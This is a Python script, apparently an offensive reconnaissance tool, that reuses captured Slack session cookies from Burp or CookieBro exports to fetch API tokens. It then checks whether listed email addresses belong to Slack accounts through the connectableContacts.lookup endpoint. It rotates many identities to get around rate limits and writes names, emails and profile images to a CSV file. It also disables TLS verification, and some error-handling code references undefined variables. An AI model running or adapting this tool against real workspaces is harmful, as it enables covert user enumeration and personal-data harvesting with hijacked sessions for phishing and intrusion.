#!/usr/bin/env python3

#==[ SETTINGS ]===============================================================#

default_user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0'

# The hostname of the workspace where all your Slack IDs reside.
default_host = 'YOUR-WORKSPACE.slack.com'

# Folder where Slack IDs are saved in CookieBro format.
cookies_dir = 'slack_ids-cookiebro'

# Folder where Slack IDs are saved in Burp/raw HTTP request format.
http_requests_dir = 'slack_ids-burp'

# Output file containing details of all enumerated users.
output_file = 'slack-users.csv'

# File where are all errors are logged.
error_log = 'errors.txt'

# Number of seconds to sleep between each user enumeration request
enumeration_delay = 5

# Number of seconds the enumeration_delay will increase each time a slack_id
# gets rate limited.
#
# Set to 0.0 to disable.
#
# Reference:
#      1 = increase 1 second when 1 account is rate-limited
#    0.5 = increase 1 second after 2 accounts have been rate-limited
#    0.1 = increase 1 second after 10 accounts have been rate-limited
#   0.05 = increase 1 second after 20 accounts have been rate-limited
#   0.01 = increase 1 second after 100 accounts have been rate-limited
enumeration_delay_auto_increase = 0.0

# Maximum number of seconds to cap the enumeration_delay_auto_increase.
max_enumeration_delay = 10

# Number of seconds to sleep a Slack ID when it has been rate limited.
ratelimit_sleep = 1800

# Optionally proxy this script through an intercepting proxy like Burp Suite.
#default_proxies = { 'https': "http://127.0.0.1:8080", }
default_proxies = {}

#==[ SETTINGS END ]===========================================================#


import requests
import re
import json
import sys
import datetime
import time
import os
import csv

# Disable insecure requests warnings -- for proxying through Burp
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def extract_slack_creds_from_raw_http_request(burp_request):
    '''
    Extract a Slack identity from a raw HTTP request, copied from Burp Suite.
    '''

    output = {}

    # Default values that are returned if expected data is not found.
    user_agent, cookies, host = None, None, None

    # Clone the User-Agent header.
    p = re.compile(r'^User-Agent:.*',re.IGNORECASE|re.MULTILINE)
    result = p.findall(burp_request)
    if len(result) > 0:
        # simple way for parsing out UA
        # need to make more error resilient
        # - ex. if UA is not present
        user_agent = result[0][len('User-Agent: '):].strip()
    output['user_agent'] = user_agent

    # Extract the user's cookies.
    p = re.compile(r'^Cookie:.*',re.IGNORECASE|re.MULTILINE)
    result = p.findall(burp_request)
    if len(result) > 0:
        cookies=result[0][len('Cookie: '):]
        cookies_list = [c.strip() for c in cookies.split(';')]
        cookies_dict = {}
        for cookie in cookies_list:
            key = cookie.split('=')[0]
            
            # Get cookie values AND account for any values that contain an `=`.
            values = cookie.split('=')[1:]
            if len(values) == 1:
                value = values[0]
            else:
                value = "=".join(values)
            cookies_dict[key] = value
    output['cookies'] = cookies_dict

    # Gather the hostname where this user is authenticated
    p = re.compile(r'^Host:.*',re.IGNORECASE|re.MULTILINE)
    result = p.findall(burp_request)
    if len(result) > 0:
        host = result[0][len('Host: '):]
    output['host'] = host

    return output


def extract_cookiebro_cookies(filename, default_user_agent=default_user_agent,
                              default_host=default_host):
    '''
    Extract a Slack identity from cookies exported with the CookieBro browser
    extension.
    '''


    output = {'host': default_host, 'user_agent': default_user_agent}

    with open(filename, 'r') as _f:
        data = _f.read()

    cookie_data = json.loads(data)

    cookies = {}

    for cookie in cookie_data:
        name = cookie.get('name')
        value = cookie.get('value')
        cookies[name] = value
        
    output['cookies'] = cookies

    return output


def get_api_token(session, host=default_host):
    '''
    Request an API token from the Slack API for the given Slack identity
    (session). 
    
    Returns None if the session is invalid, such as if the user is no longer
    logged in.
    '''

    token_url = f'https://{host}/ssb/redirect'
    
    request_failed = False
    tries = 1
    max_tries = 3
    while tries <= max_tries:
        try:
            data = session.get(token_url, verify=False)
            break
        except Exception as e:
            error(e)
            if retries < max_tries:
                retry_message = f"Retrying ({tries}/{max_tries})..."
                time.sleep(enumeration_delay)
            else:
                retry_message = f"Retries exhausted. Skipping."
                request_failed = True
            error(f"[!] [{slack_id}] Error making enumeration request. {retry_message}")
            tries +=1
    if request_failed: return None
    
    p = re.compile(r'"api_token":"[^"]+"',re.IGNORECASE)
    result = p.findall(data.text)
    #print(result)

    # If an API token was found...
    if len(result) > 0:
        api_token = result[0][len('"api_token":"'):-1]
    
    # If no API token was found:
    else:
        api_token = None

    #print(api_token)
    return api_token


def enumerate_user(target_user, slack_id, session, host=default_host):
    '''
    Issue Slack API request to enumerate a single user account.
    
    Returns one of the following tuples:
    - User does not exist:      ( 'not found', [] )
    - User exists:              ( 'found', user_data['contacts'] )
    - Slack ID is rate limited: ( 'ratelimited', time_of_ratelimiting )
    - Unknown error:            ( 'unknown error', response.text )
    '''

    url = f'https://{host}/api/connectableContacts.lookup'

    data = {
        'token': (None, api_token),
        'email': (None, target_user),
        '_x_reason': (None, 'slack-connect-hub-contact-lookup'),
        '_x_mode': (None, 'online'),
        '_x_sonic': (None, 'true'),
        '_x_app_name': (None, 'client'),
    }

    request_failed = False
    tries = 1
    max_tries = 3
    while tries <= max_tries:
        try:
            response = session.post(url, files=data, verify=False)
            break
        except Exception as e:
            error(e)
            if retries < max_tries:
                retry_message = f"Retrying ({tries}/{max_tries})..."
                time.sleep(enumeration_delay)
            else:
                retry_message = f"Retries exhausted. Skipping."
                request_failed = True
            error(f"[!] [{slack_id}] Error making enumeration request. {retry_message}")
            tries +=1
    if request_failed: return ( 'unknown error', str(e) )
            
    try:
        user_data = json.loads(response.text)
    except:
        user_data = {}

    # This works. Invalid users have a `contacts` key but it has no contents.
    if 'contacts' in user_data.keys():
        if len(user_data['contacts']) == 0:
            #print(f"[!] No Slack account found for: {target_user}")
            return ( 'not found', user_data['contacts'] ) # Returns empty list
        else:
            return ( 'found', user_data['contacts'] ) # Returns list of contacts

    # Check if response indicated rate limiting.
    elif 'error' in user_data.keys() and user_data.get('error') == 'ratelimited':
        time_of_ratelimiting = datetime.datetime.now().timestamp()
        return ( 'ratelimited', time_of_ratelimiting )

    # Handle all other situations as unknown errors.
    else:
        return ( 'unknown error', response.text )



def output_enumerated_user(slack_id, target_user, contacts, output_file):
    '''
    Log user enumeration details to a CSV output file.
    '''
    
    if not os.path.isfile(output_file):
        write_headers = True
    else:
        write_headers = False

    with open(output_file, 'a', newline='') as csvfile:
        csv_writer = csv.writer(csvfile, delimiter=',', quotechar='"',
                                quoting=csv.QUOTE_MINIMAL)
        
        if write_headers:
            csv_writer.writerow([   "Scanned by",
                                    "Target user",
                                    "Slack account found",
                                    "Email",
                                    "Name",
                                    "Profile image (small)",
                                    "Profile image (large)",
                                    "External ID"
                                    ])
        
        if contacts == []:
            csv_writer.writerow([
                slack_id,
                target_user,
                "False",
                ])        
        else:
            for contact in contacts:
                csv_writer.writerow([
                    slack_id,
                    target_user,
                    str(contact.get('is_on_slack')),
                    str(contact.get('email')),
                    str(contact.get('name')),
                    str(contact.get('image_72')),
                    str(contact.get('image_512')),
                    str(contact.get('external_id')),
                    ])


def error(output="", error_log=error_log):
    '''
    Print errors to screen and write them to the error_log file.
    '''

    print(str(output))
    with open(error_log, 'a') as _f:
        _f.write(str(output) + "\n")


usage = 'usage: ' + sys.argv[0] + ' <TARGET/TARGETS LIST> [--sanity]'

# Print usage
if len(sys.argv) == 1 or '-h' in sys.argv or '--help' in sys.argv:
    print(usage)
    exit()


# Detect if target is a single user or list of users
target = sys.argv[1]

if os.path.isfile(target):
    with open(target, 'r') as _f:
        target_users = [line.strip() for line in _f.readlines()]
else:
    target_users = [ target ]


# Import Slack identities (session cookies, user agents, hostnames) from files.
slack_identities = {}

# Import Slack identities from raw HTTP data.
requests_files = os.listdir(http_requests_dir)

for filename in requests_files:
    with open(http_requests_dir + os.sep + filename,'r') as _f:
        raw_data = _f.read()
    slack_identities[filename] = extract_slack_creds_from_raw_http_request(raw_data)

# Import Slack identities from CookieBro exported files.
cookie_files = os.listdir(cookies_dir)

for filename in cookie_files:
    slack_identities[filename] = extract_cookiebro_cookies(cookies_dir + os.sep + filename)


# Create a Session object to track HTTP cookies and configurations for every 
# Slack identity.
for slack_id in slack_identities.keys():
    slack_identity = slack_identities[slack_id]
    
    session = requests.Session()
    
    session.cookies.update(slack_identity['cookies'])
    
    user_agent = slack_identity['user_agent']
    if not slack_identity['user_agent']:
        user_agent = default_user_agent
    
    headers = {'User-Agent': user_agent}
    session.headers.update(headers)
    
    session.proxies.update(default_proxies)
    
    slack_identities[slack_id]['session'] = session


# If the '--sanity' flag is used, check that all Slack identities are working
# by testing the same (known-valid) target_user with ALL Slack identities.
if len(sys.argv) > 2 and '--sanity' in sys.argv:
    slack_id_count = len(slack_identities.keys())
    top_target = target_users[0]
    target_users = []
    for n in range(0,slack_id_count):
        target_users.append(top_target)
    print(f"\n[!] Sanity check enabled with target user: {target_users[0]}\n")
    sanity_check = True
else:
    sanity_check = False


# Variables that track which target_user gets targeted next.
target_index = 0
target_count = len(target_users)

# Tracks which Slack identities are currently rate limited.
ratelimit_tracker = {}

# Tracks any Slack identities that could not retrieve an API key.
problem_slack_ids = []


# Print helpful statistics before beginning
users_per_day = 86400 / enumeration_delay
max_users_per_day = 86400 / max_enumeration_delay
slack_identities_count = len(slack_identities.keys())
targets_per_slack_id = target_count / slack_identities_count
repeat_rate = enumeration_delay * slack_identities_count
days = target_count / ( users_per_day + 0.0 )
max_days = target_count / ( max_users_per_day + 0.0 )
helpful_statistics = f"""
[*] target_users loaded: {target_count}

[*] enumeration_delay is set to: {enumeration_delay} seconds
    - At this rate, you will be able to enumerate a MAXIMUM of
      {users_per_day} user accounts per day.
    - It will take at least {days} days to scan all {target_count} target_users.

[*] enumeration_delay_auto_increase is set to: {enumeration_delay_auto_increase} seconds

[*] max_enumeration_delay is set to: {max_enumeration_delay} seconds
    - At this rate, you will be able to enumerate a MAXIMUM of
      {max_users_per_day} user accounts per day.
    - It may take up to {max_days} days (or more) to scan all {target_count} target_users.

[*] slack_id's loaded: {slack_identities_count}
    - Each slack_id will only need to scan a total of
      {targets_per_slack_id} target_users.
    - At this rate, the time between repeat requests from the *same* slack_id
      will be: {repeat_rate} seconds (or {repeat_rate / 60.0} minutes)


Press ENTER to launch the scan or CTRL+C to quit.
"""
print(helpful_statistics)
try: input()
except: exit()


# Start the gatling gun. 😎
keep_going = True
while keep_going:
    
    # Remove any Slack IDs that could not retrieve an API key.
    for slack_id in problem_slack_ids:
        if slack_id in slack_identities.keys():
            slack_identities.pop(slack_id)
        else:
            error(f"[!] Could not find slack_id '{slack_id}' in slack_identities.keys().")
        # Also remove one of the target_users if sanity check is enabled, to
        # keep the count right, since they're all the same user.
        if sanity_check:
            target_users.pop()
            # Got to update the target users count after removing one.
            target_count = len(target_users)
    # Clear problem_slack_ids after processing, so this part doesn't run again.
    problem_slack_ids = []

    for slack_id in slack_identities.keys():

        # Check if this slack_id is currently rate-limited.
        if slack_id in ratelimit_tracker.keys():
            ratelimit_start = ratelimit_tracker[slack_id]
            ratelimit_end = ratelimit_start + ratelimit_sleep
            now = datetime.datetime.now().timestamp()
            remaining = ratelimit_end - now
            
            if now < ratelimit_end:
                print(f"\n[.] [{slack_id}] Sleeping {remaining} more seconds...\n")
                time.sleep(enumeration_delay)
                continue

        slack_identity = slack_identities[slack_id]

        host = slack_identity['host']
        if not slack_identity['host']:
            host = default_host    

        session = slack_identity['session']
        
        # Get API token, and in doing so, confirm that slack_id is (still) logged in.
        api_token = get_api_token(session, host)
        if not api_token:
            print()
            error(f"[!] [{slack_id}] Slack ID could not retrieve API token!")
            print(f"[!] [{slack_id}] Will skip {slack_id} from now on.")
            print()
            problem_slack_ids.append(slack_id)
            continue


        # Iterate over target_users with each round.
        if target_index >= target_count:
            keep_going = False
            break
        target_user = target_users[target_index]
        target_index += 1

        output = enumerate_user(target_user, slack_id, session, host)
        
        if output[0] == 'not found' or output[0] == 'found':
            contacts = output[1]
            
            if output[0] == 'not found':
                print(f'[-] [{slack_id}] ({target_index}/{target_count}) Invalid account: {target_user}')
            else:
                print(f"\n[+] [{slack_id}] ({target_index}/{target_count}) Slack account confirmed: {target_user}\n")
            
            # Don't save the output file if --sanity-check is enabled.
            # Otherwise, log all valid and invalid target users.
            if not sanity_check:
                output_enumerated_user(slack_id, target_user, contacts, output_file)
        
        elif output[0] == 'ratelimited':
            timestamp = output[1]
            print(f"\n[!] [{slack_id}] Rate limiting detected! ({timestamp})")

            if enumeration_delay_auto_increase > 0:
                enumeration_delay += enumeration_delay_auto_increase
                if enumeration_delay > max_enumeration_delay:
                    enumeration_delay = max_enumeration_delay
                    print(f"    * Enumeration delay capped at max of: {enumeration_delay} seconds.")

                else:
                    print(f"    * Increasing enumeration_delay to: {enumeration_delay} seconds.")
            print() 
            ratelimit_tracker[slack_id] = timestamp
            # Rewind the target_index by 1 if rate limiting prevented enumeration.
            target_index -= 1
            
            
        else:
            error_output = output[1]
            error(f"\n[?] [{slack_id}] Unknown error detected:")
            error(error_output)
            error("")
            # Rewind the target_index by 1 if an error prevented enumeration.
            target_index -= 1
            

        time.sleep(enumeration_delay)